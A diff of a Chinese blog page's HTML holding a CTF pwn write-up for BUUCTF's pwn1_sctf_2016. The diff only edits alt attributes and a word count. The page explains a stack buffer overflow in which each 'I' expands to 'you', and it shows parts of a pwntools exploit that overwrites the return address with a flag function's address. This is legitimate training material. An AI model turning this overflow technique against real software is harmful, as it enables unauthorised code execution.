@@ -430,8 +430,8 @@ vuln函数看起来很大一坨，实际上都是C++的一些东西，函数的�
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/1.jpg" alt><br>32位程序，开启栈不可执行<br>IDA分析，vuln函数和后门函数<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/2.jpg" alt><br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/3.jpg" alt></p>
-<p>vuln函数看起来很大一坨，实际上都是C++的一些东西，函数的真正意思其实就是把I替换成you<br>执行程序试一试<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/4.jpg" alt><br>如我们所想一样<br>再看向缓冲区<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt><br>gets允许输入32个字节，而s的缓冲区多达3C个字节，也就是相对于ebp有60个字节，则相对于eip有64个字节，正常输入的话无法造成缓冲区溢出<br>但结合程序会把’I’替换成’you’的效果来看，只要我们输入21个’I’，经过三倍字节替换后就会变成63个字节，再加上一个字节就能造成缓冲区溢出<br>所以可以写出exp如下</p>
+                <p>checksec<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/1.jpg" alt=""><br>32位程序，开启栈不可执行<br>IDA分析，vuln函数和后门函数<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/3.jpg" alt=""></p>
+<p>vuln函数看起来很大一坨，实际上都是C++的一些东西，函数的真正意思其实就是把I替换成you<br>执行程序试一试<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/4.jpg" alt=""><br>如我们所想一样<br>再看向缓冲区<br><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>gets允许输入32个字节，而s的缓冲区多达3C个字节，也就是相对于ebp有60个字节，则相对于eip有64个字节，正常输入的话无法造成缓冲区溢出<br>但结合程序会把’I’替换成’you’的效果来看，只要我们输入21个’I’，经过三倍字节替换后就会变成63个字节，再加上一个字节就能造成缓冲区溢出<br>所以可以写出exp如下</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
 <span class="token comment" spellcheck="true">#io = process('./pwn1_sctf_2016')</span>
@@ -442,7 +442,7 @@ payload <span class="token operator">+=</span> <span class="token string">'A'</s
 payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>get_flag_addr<span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt><br>成功读取flag</p>
+<p><img src="/LawlietLW.github.io/2020/01/30/buuctf-pwn1-sctf-2016/5.jpg" alt=""><br>成功读取flag</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -854,7 +854,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">7.2k</span>&nbsp;字
+                class="white-color">11.9k</span>&nbsp;字
             
             
             
